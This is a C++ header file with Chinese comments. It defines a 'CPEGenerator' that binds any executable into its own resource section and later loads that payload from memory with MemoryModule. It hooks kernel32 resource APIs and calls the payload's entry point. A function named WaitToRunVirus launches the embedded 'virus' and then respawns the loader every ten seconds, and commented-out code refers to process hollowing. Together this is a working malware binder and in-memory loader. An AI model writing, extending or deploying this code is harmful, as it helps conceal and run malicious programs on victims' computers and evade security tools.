#pragma once
#include "resource.h"

#include "MemoryModule.h"
// #include "ProcessHollowing.h"

#include <windows.h>
#include <iostream>
#include <fstream>
#include <thread>
#include <DbgHelp.h>

#include <atlstr.h>

#pragma comment(lib, "Dbghelp.lib")

extern HMEMORYMODULE g_mem_pe;
extern FARPROC OriginalFindResource;
extern FARPROC OriginalLoadResource;

BOOL CALLBACK EnumLangsProc(HMODULE hModule, LPCWSTR lpType, LPCWSTR lpName, WORD wLanguage, LONG_PTR lParam);
BOOL CALLBACK EnumNamesProc(HMODULE hModule, LPCWSTR lpType, LPWSTR lpName, LONG_PTR lParam);
BOOL CALLBACK EnumTypesProc(HMODULE hModule, LPWSTR lpType, LONG_PTR lParam);
BOOL AddFileToResource(LPCWSTR exePath, LPCWSTR resourceFilePath, LPCWSTR newExePath);

// 枚举资源类型的回调函数
BOOL CALLBACK EnumTypesProc32(HMODULE hModule, LPWSTR lpType, LONG_PTR lParam);
BOOL CALLBACK EnumNamesProc32(HMODULE hModule, LPCWSTR lpType, LPWSTR lpName, LONG_PTR lParam);
BOOL CALLBACK EnumLangsProc32(HMODULE hModule, LPCWSTR lpType, LPCWSTR lpName, WORD wLanguage, LONG_PTR lParam);
BOOL AddFileToResource32(LPCWSTR exePath, LPCWSTR resourceFilePath, LPCWSTR newExePath);

// 用于 Process Hollowing 的辅助线程函数
DWORD WINAPI HollowingThread(LPVOID lpParam);
HMODULE WINAPI CustomFindResource(HMODULE hModule, LPCTSTR lpName, LPCTSTR lpType);
HGLOBAL WINAPI CustomLoadResource(HMODULE hModule, HRSRC hResInfo);

// 将资源添加到新文件的结构体
struct ResourceUpdateData {
    HANDLE hUpdate;
};

struct ResourceUpdateData32 {
    HANDLE hUpdate;
};

class CPEGenerator
{
public:
	CPEGenerator() {

	}
	~CPEGenerator() {

	}

public:
    void ParseParams(int argc, wchar_t* argv[]) {
        if (argc <= 1) {
            // WaitToRunVirus();
            MemoryLoadToRun(IDR_BINARY_FILE);
        }
        else if (argc == 2) {
            CString str_param = argv[1];
            if (str_param == L"run") {
                // ExtractAndRunResourceProgram(IDR_BINARY_FILE);
                MemoryLoadToRun(IDR_BINARY_FILE);
                // RunPE();

                //HANDLE hMainThread = OpenThread(THREAD_ALL_ACCESS, FALSE, GetCurrentThreadId());
                //if (!hMainThread) {
                //    return;
                //}

                //// 创建辅助线程执行 Hollowing
                //HANDLE hThread = CreateThread(NULL, 0, HollowingThread, hMainThread, 0, NULL);
                //if (!hThread) {
                //    CloseHandle(hMainThread);
                //    return;
                //}

                //// 等待辅助线程完成
                //WaitForSingleObject(hThread, INFINITE);
                //CloseHandle(hThread);
                //CloseHandle(hMainThread);

            }
            else if (str_param == L"wait") {
                return;
            }
        }
        else if(argc >= 3) {
            WCHAR exePath[MAX_PATH];
            // 获取当前程序的路径
            DWORD result = GetModuleFileName(NULL, exePath, MAX_PATH);
            LPCWSTR resourceFilePath = argv[1];
            LPCWSTR newExePath = argv[2];
#ifdef _WIN64
            AddFileToResource(exePath, resourceFilePath, newExePath);
#else
            AddFileToResource32(exePath, resourceFilePath, newExePath);
#endif
        }
    }   

    //BOOL AddFileToResource(LPCWSTR exePath, LPCWSTR resourceFilePath, LPCWSTR newExePath) {
    //    WCHAR tempFilePath[MAX_PATH];

    //    // 创建临时文件路径
    //    GetTempPath(MAX_PATH, tempFilePath);
    //    GetTempFileName(tempFilePath, L"tmp", 0, tempFilePath);

    //    // 将当前可执行文件复制到临时文件
    //    if (!CopyFile(exePath, tempFilePath, FALSE)) {
    //        MessageBox(NULL, L"Failed to create temporary file.", L"generator", MB_OK);
    //        return FALSE;
    //    }

    //    // 打开临时文件进行资源更新
    //    HANDLE hUpdate = BeginUpdateResource(tempFilePath, FALSE);
    //    if (!hUpdate) {
    //        MessageBox(NULL, L"Failed to open file for resource update.", L"generator", MB_OK);
    //        DeleteFile(tempFilePath); // 删除临时文件
    //        return FALSE;
    //    }

    //    // 打开要添加到资源的文件
    //    std::ifstream file(resourceFilePath, std::ios::binary);
    //    if (!file.is_open()) {
    //        MessageBox(NULL, L"Failed to open the input file.", L"generator", MB_OK);
    //        EndUpdateResource(hUpdate, TRUE);
    //        DeleteFile(tempFilePath); // 删除临时文件
    //        return FALSE;
    //    }

    //    // 读取文件内容到内存
    //    file.seekg(0, std::ios::end);
    //    size_t fileSize = file.tellg();
    //    file.seekg(0, std::ios::beg);

    //    char* buffer = new char[fileSize];
    //    file.read(buffer, fileSize);
    //    file.close();

    //    // 将文件内容更新到资源中
    //    if (!UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(IDR_BINARY_FILE), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), buffer, fileSize)) {
    //        MessageBox(NULL, L"Failed to update the resource.", L"generator", MB_OK);
    //        delete[] buffer;
    //        EndUpdateResource(hUpdate, TRUE);
    //        DeleteFile(tempFilePath); // 删除临时文件
    //        return FALSE;
    //    }

    //    delete[] buffer;

    //    // 完成资源更新
    //    if (!EndUpdateResource(hUpdate, FALSE)) {
    //        MessageBox(NULL, L"Failed to finalize resource update.", L"generator", MB_OK);
    //        DeleteFile(tempFilePath); // 删除临时文件
    //        return FALSE;
    //    }

    //    // 将修改后的临时文件复制到目标文件路径
    //    if (!CopyFile(tempFilePath, newExePath, FALSE)) {
    //        MessageBox(NULL, L"Failed to create the final output file.", L"generator", MB_OK);
    //        DeleteFile(tempFilePath); // 删除临时文件
    //        return FALSE;
    //    }

    //    // 删除临时文件
    //    DeleteFile(tempFilePath);

    //    MessageBox(NULL, L"Resource added successfully.", L"generator", MB_OK);
    //    return TRUE;
    //}


    // 获取当前进程的资源段基地址
    IMAGE_RESOURCE_DIRECTORY* GetCurrentProcessResourceDirectory() {
        HMODULE hModule = GetModuleHandle(NULL);
        if (!hModule) return nullptr;

        IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)hModule;
        IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)hModule + dosHeader->e_lfanew);

        DWORD resourceRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].VirtualAddress;
        if (resourceRVA == 0) return nullptr;

        return (IMAGE_RESOURCE_DIRECTORY*)((BYTE*)hModule + resourceRVA);
    }

    void RedirectResourceDirectory(HMEMORYMODULE loadedModule, IMAGE_RESOURCE_DIRECTORY* newResourceDir) {
        IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)loadedModule;
        IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)loadedModule + dosHeader->e_lfanew);

        // 修改资源目录的 RVA 和大小指向当前进程的资源段
        ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].VirtualAddress = (DWORD)((BYTE*)newResourceDir - (BYTE*)loadedModule);
    }

    HANDLE RunGenerator(CString cmdline) {
        BOOL flag = FALSE;

        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };

        // 使用 CreateProcess 运行自身
        flag = CreateProcess(
            NULL,                       // 应用程序名称
            cmdline.GetBuffer(),            // 命令行
            NULL,                       // 进程安全性属性
            NULL,                       // 线程安全性属性
            FALSE,                      // 是否继承句柄
            0,                          // 创建标志
            NULL,                       // 环境变量
            NULL,                       // 当前目录
            &si,                        // 启动信息
            &pi                         // 进程信息
        );
        cmdline.ReleaseBuffer();

        if (flag) {
            std::wcout << L"成功启动自身，进程ID：" << pi.dwProcessId << std::endl;
            // 关闭进程和线程句柄
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
        else {
            std::cerr << "启动失败，错误码：" << GetLastError() << std::endl;
        }

        return pi.hProcess;
    }

    BOOL WaitToRunVirus() {
        // 获取当前程序的完整路径
        wchar_t modulePath[MAX_PATH];
        GetModuleFileName(NULL, modulePath, MAX_PATH);

        // 构造命令行参数，包含程序路径和参数
        CString commandLine;
        commandLine.Format(L"\"%s\" wait", modulePath); // 注意引号包裹路径
        // commandLine.Format(L"\"%s\"", modulePath); // 注意引号包裹路径

        // 先启动病毒先
        CString run_vir;
        run_vir.Format(L"\"%s\" run", modulePath); // 注意引号包裹路径
        RunGenerator(run_vir);


        while (FileExists(modulePath)) {
            // 设置启动信息和进程信息结构体
            
            RunGenerator(commandLine);
            Sleep(10000);
        }
        return TRUE;
    }

    BOOL MemoryLoadToRun(int resourceId) {

        MessageBox(NULL, L"test", L"test", MB_OK);

        BOOL flag = FALSE;
        try {
            // 加载当前模块
            HMODULE hModule = GetModuleHandle(NULL);
            if (!hModule) {
                std::wcerr << L"Failed to load module.\n";
                return flag;
            }

            // 查找资源
            HRSRC hResource = FindResource(hModule, MAKEINTRESOURCE(resourceId), RT_RCDATA);
            if (!hResource) {
                std::wcerr << L"Failed to find resource.\n";
                return flag;
            }

            // 加载资源
            HGLOBAL hResData = LoadResource(hModule, hResource);
            if (!hResData) {
                std::wcerr << L"Failed to load resource.\n";
                return flag;
            }

            // 获取资源大小和数据指针
            DWORD dataSize = SizeofResource(hModule, hResource);
            void* pData = LockResource(hResData);

            // 2. 使用 MemoryLoadLibrary 将 EXE 加载到内存
            HMEMORYMODULE hmemModule = MemoryLoadLibrary(pData, dataSize);
            if (!hmemModule) {
                std::cout << "Failed to load EXE into memory." << std::endl;
                return flag;
            }

            g_mem_pe = hmemModule;
            // 获取原始 API 的地址
#ifdef _WIN64
            OriginalFindResource = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "FindResourceA");
            OriginalLoadResource = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadResource");
#else
            OriginalFindResource = GetProcAddress(GetModuleHandle("kernel32.dll"), "FindResourceA");
            OriginalLoadResource = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadResource");
#endif

            // Hook API 函数
            HookAPIFunction("kernel32.dll", "FindResourceA", (FARPROC)CustomFindResource, &OriginalFindResource);
            HookAPIFunction("kernel32.dll", "LoadResource", (FARPROC)CustomLoadResource, &OriginalLoadResource);

            

            // 获取当前进程的资源目录地址
            IMAGE_RESOURCE_DIRECTORY* currentResourceDir = GetCurrentProcessResourceDirectory();
            if (currentResourceDir) {
                // 重定向内存加载 EXE 的资源目录指针
                RedirectResourceDirectory(hmemModule, currentResourceDir);
            }
            else {
                std::cerr << "Failed to locate current process resource directory." << std::endl;
            }
            
            

            // 3. 获取 EXE 文件的入口点并调用
            MemoryCallEntryPoint(hmemModule);

            // 4. 卸载 EXE 文件
            MemoryFreeLibrary(hmemModule);
        }
        catch (const std::exception& e) {
            std::cout << "Error: " << e.what() << std::endl;
            return flag;
        }
        return flag;
    }

    bool FileExists(CString filePath) {
        DWORD fileAttr = GetFileAttributes(filePath);
        // 如果返回值为 INVALID_FILE_ATTRIBUTES，表示文件不存在或出错
        return (fileAttr != INVALID_FILE_ATTRIBUTES && !(fileAttr & FILE_ATTRIBUTE_DIRECTORY));
    }

    BOOL ExtractAndRunResourceProgram(int resourceId) {
        // 加载当前模块
        HMODULE hModule = GetModuleHandle(NULL);
        if (!hModule) {
            std::wcerr << L"Failed to load module. code  = " << GetLastError() << "\n";
            return FALSE;
        }

        // 查找资源
        HRSRC hResource = FindResource(hModule, MAKEINTRESOURCE(resourceId), RT_RCDATA);
        if (!hResource) {
            std::wcerr << L"Failed to find resource.\n";
            return FALSE;
        }

        // 加载资源
        HGLOBAL hResData = LoadResource(hModule, hResource);
        if (!hResData) {
            std::wcerr << L"Failed to load resource.\n";
            return FALSE;
        }

        // 获取资源大小和数据指针
        DWORD dataSize = SizeofResource(hModule, hResource);
        void* pData = LockResource(hResData);

        // 将资源数据写入临时文件
        WCHAR tempPath[MAX_PATH];
        WCHAR tempFile[MAX_PATH];
        GetTempPath(MAX_PATH, tempPath);
        GetTempFileName(tempPath, L"tmp", 0, tempFile);

        std::ofstream outFile(tempFile, std::ios::binary);
        if (!outFile.is_open()) {
            std::wcerr << L"Failed to create temp file.\n";
            return FALSE;
        }
        outFile.write((char*)pData, dataSize);
        outFile.close();

        // 创建一个进程运行提取的程序
        STARTUPINFO si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        if (!CreateProcess(tempFile, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            std::wcerr << L"Failed to run the extracted program.\n";
            DeleteFile(tempFile); // 删除临时文件
            return FALSE;
        }

        // 等待程序结束
        WaitForSingleObject(pi.hProcess, INFINITE);

        // 清理
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        DeleteFile(tempFile); // 删除临时文件

        std::wcout << L"Program executed successfully.\n";
        return TRUE;
    }

    // 用于资源更新


private:



};
